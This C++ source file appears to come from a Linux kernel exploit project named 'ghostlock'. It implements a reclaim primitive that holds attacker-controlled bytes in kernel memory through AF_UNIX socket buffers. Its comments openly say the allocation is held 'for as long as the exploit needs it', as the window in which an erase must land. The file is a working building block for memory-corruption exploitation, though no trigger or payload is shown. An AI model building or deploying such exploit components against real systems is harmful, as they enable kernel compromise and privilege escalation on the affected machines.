#include "reclaim/page_carrier.h"

#include <sys/socket.h>
#include <unistd.h>

namespace ghostlock::reclaim {
namespace {

/* AF_UNIX SOCK_STREAM, head-resident payload.
 *
 * net/unix/af_unix.c keeps `size <= SKB_MAX_HEAD(0)` in `skb->head`, which is one
 * kmalloc(SKB_DATA_ALIGN(size) + SKB_DATA_ALIGN(sizeof(struct skb_shared_info)))
 * and the user bytes start at offset 0 of that object. The skb stays in the
 * receiver's queue until recv(), so the page remains ours for as long as the
 * exploit needs it -- that is the window the erase has to land in.
 *
 * The socketpair is created in acquire() so a failed allocation never leaves a
 * transport behind; both ends are closed in release(). */
class UnixSkbCarrier final : public PageCarrier {
 public:
  explicit UnixSkbCarrier(size_t payload_bytes) noexcept
      : PageCarrier(unix_skb_geometry(payload_bytes)) {}

  ~UnixSkbCarrier() override { (void)release(); }

  CarrierKind kind() const noexcept override { return CarrierKind::kUnixSkb; }
  const CarrierGeometry &geometry() const noexcept override { return geometry_; }

  CarrierStatus acquire() noexcept override {
    if (!geometry_valid(geometry_) || fd_[0] >= 0) {
      return CarrierStatus::kInvalid;
    }
    if (::socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, fd_) != 0) {
      fd_[0] = -1;
      fd_[1] = -1;
      return CarrierStatus::kIo;
    }
    return CarrierStatus::kOk;
  }

  CarrierStatus commit() noexcept override {
    if (fd_[0] < 0) {
      return CarrierStatus::kInvalid;
    }
    const size_t len = payload_bytes();
    size_t sent = 0;
    while (sent < len) {
      const ssize_t written =
          ::send(fd_[0], staging_.data() + sent, len - sent, MSG_NOSIGNAL);
      if (written <= 0) {
        return CarrierStatus::kIo;
      }
      sent += static_cast<size_t>(written);
    }
    committed_ = true;
    return CarrierStatus::kOk;
  }

  CarrierStatus fetch() noexcept override {
    if (fd_[1] < 0 || !committed_) {
      return CarrierStatus::kInvalid;
    }
    const size_t len = payload_bytes();
    size_t got = 0;
    while (got < len) {
      const ssize_t read_bytes =
          ::recv(fd_[1], staging_.data() + got, len - got, 0);
      if (read_bytes < 0) {
        return CarrierStatus::kIo;
      }
      if (read_bytes == 0) {
        return CarrierStatus::kGone;
      }
      got += static_cast<size_t>(read_bytes);
    }
    committed_ = false;
    return CarrierStatus::kOk;
  }

  CarrierStatus release() noexcept override {
    for (int &fd : fd_) {
      if (fd >= 0) {
        (void)::close(fd);
        fd = -1;
      }
    }
    committed_ = false;
    return CarrierStatus::kOk;
  }

 private:
  int fd_[2] = {-1, -1};
};

}  // namespace

std::unique_ptr<PageCarrier> make_unix_skb_carrier(size_t payload_bytes) {
  if (unix_skb_geometry(payload_bytes).capacity == 0) {
    return nullptr;
  }
  return std::make_unique<UnixSkbCarrier>(payload_bytes);
}

}  // namespace ghostlock::reclaim
